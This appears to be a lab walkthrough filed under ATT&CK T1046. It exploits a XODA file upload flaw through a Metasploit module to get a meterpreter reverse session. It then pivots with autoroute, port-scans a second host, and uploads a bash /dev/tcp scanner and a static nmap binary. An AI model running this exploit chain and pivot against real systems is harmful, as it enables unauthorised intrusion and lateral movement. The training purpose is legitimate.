# T1046: Network Service Scanning

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 4164–4241. Examples are lab-specific and need verification.

In this lab, we are given access to a Kali machine. There are two target machines, one on the same network i.e. **demo1.ine.local**. This target machine is vulnerable and can be exploited using the following information. Use this information to retrieve services running on the second target machine and complete the mission!

**Vulnerability Information**

**Vulnerability:** XODA File Upload Vulnerability

**Metasploit module:** exploit/unix/webapp/xoda_file_upload

**Objective:** - Identify the ports open on the second target machine using appropriate Metasploit modules. - Write a bash script to scan the ports of the second target machine. - Upload the nmap static binary to the target machine and identify the services running on the second target machine

Tools: msf, bash, terminal, namp

**How many services are running on the second target machine?**

```bash

nmap demo1.ine.local
# port 80: As mentioned in the challenge, a XODA web app instance is running on the system which can be exploited using the “exploit/unix/webapp/xoda_file_upload” Metasploit module.
curl demo1.ine.local
msfconsole
use exploit/unix/webapp/xoda_file_upload
set RHOSTS demo1.ine.local
set TARGETURI /
set LHOST 192.63.4.2
exploit
#meterpreter session is spawned on the target machine
#start a command shell and identify ip add range of the seocnd target  machine
shell
ip addr
#The IP address of the first target machine on its eth1 interface is 192.180.108.2, the second target machine will be located at 192.180.108.3 on the second network.

run autoroute -s 192.180.108.2
#background the current meterpreter session and use portscan tcp module of msf to scan the 2nd target machine
#ctrl+z and enter y to background the meterpreter session

#Background the current meterpreter session and use the portscan tcp module of Metasploit to scan the second target machine.

use auxiliary/scanner/portscan/tcp
set RHOSTS 192.180.108.3
set verbose false
set ports 1-1000
exploit

**$ls -al /root/static-binaries/nmap
file /root/static-binaries/nmap
#check the static binaries available in the /usr/bin/ directory**

nano bash-port-scanner.sh
//
#!/bin/bash
for port in {1..1000}; do
 timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
done
//#bash port scanning script https://catonmat.net/tcp-port-scanner-in-bash
cat bash-port-scanner.sh

#Foreground the Metasploit session and switch to the meterpreter session.
Press "fg" and press enter to foreground the Metasploit session.

sessions -i 1
meterpreter> upload /root/static-binaries/nmap /tmp/nmap
meterpreter> upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
#Upload the nmap static binary and the bash port scanner script to the target machine.

#make your binary and script executable and use the bash script to scan the second target machine
shell
cd /tmp/
chmod +x ./nmap ./bash-port-scanner.sh
./bash-port-scanner.sh 192.180.108.3

./nmap -p- 192.180.108.3

#using the nmap binary, scan the target machine for open port

```
